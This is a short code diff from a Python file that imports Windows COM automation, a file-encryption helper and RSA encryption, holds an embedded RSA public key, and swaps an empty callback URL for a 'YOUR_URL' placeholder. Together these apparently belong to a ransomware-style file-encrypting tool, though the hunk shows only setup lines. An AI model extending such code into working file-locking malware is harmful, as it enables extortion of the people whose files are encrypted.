@@ -28,7 +28,7 @@ from win32com.client import Dispatch
 from file_crypto import encrypt_file # type: ignore
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
-YOUR_URL = "" # with open("url", "r") as f: YOUR_URL = f.read()
+YOUR_URL = "YOUR_URL" # with open("url", "r") as f: YOUR_URL = f.read()
 id = ""
 
 RSA_PUBLIC_KEY = """-----BEGIN RSA PUBLIC KEY-----
